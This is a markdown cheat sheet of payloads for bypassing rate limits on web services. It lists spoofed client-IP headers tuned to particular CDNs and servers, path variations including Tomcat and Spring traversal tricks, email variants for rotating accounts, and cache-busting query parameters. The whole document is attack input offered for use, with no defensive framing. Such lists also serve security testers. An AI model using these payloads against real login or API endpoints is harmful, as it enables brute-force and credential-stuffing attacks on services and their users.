# Rate Limit Bypass Payloads

## IP Spoofing Headers by CDN

### Cloudflare
CF-Connecting-IP: <spoofed-ip>
True-Client-IP: <spoofed-ip>
# Note: X-Forwarded-For is IGNORED by default on Cloudflare

### AWS ALB / CloudFront
X-Forwarded-For: <spoofed-ip>, <real-ip>
# Note: ALB APPENDS your real IP. Place spoofed IP first in chain.

### Nginx (default config)
X-Real-IP: <spoofed-ip>
# Note: Takes precedence over X-Forwarded-For in most Nginx configs

### Akamai
X-Akamai-Client-IP: <spoofed-ip>
Fastly-Client-IP: <spoofed-ip>

### Generic (try all)
X-Forwarded-For: <spoofed-ip>
X-Client-IP: <spoofed-ip>
X-Cluster-Client-IP: <spoofed-ip>
X-Originating-IP: <spoofed-ip>
X-Remote-Addr: <spoofed-ip>
X-Remote-IP: <spoofed-ip>
Forwarded: for=<spoofed-ip>
Via: 1.1 <spoofed-ip>

## Path Variation Payloads
/api/login          # baseline
/api/login/         # trailing slash
/API/LOGIN          # uppercase
/api//login         # double slash
/api/./login        # dot segment
/api/login?         # trailing question mark
/api/login#         # fragment
/%61%70%69/login    # URL-encoded path
/api/login;         # semicolon (Tomcat)
/api/..;/api/login  # Spring path traversal

## Account Rotation Payloads
user@example.com
User@example.com
user+tag1@example.com
user%40example.com
user@Example.com
user+tag2@example.com

## Parameter Pollution
?_=<timestamp>
?utm_source=bypass1
?nocache=<random>
?callback=<random>
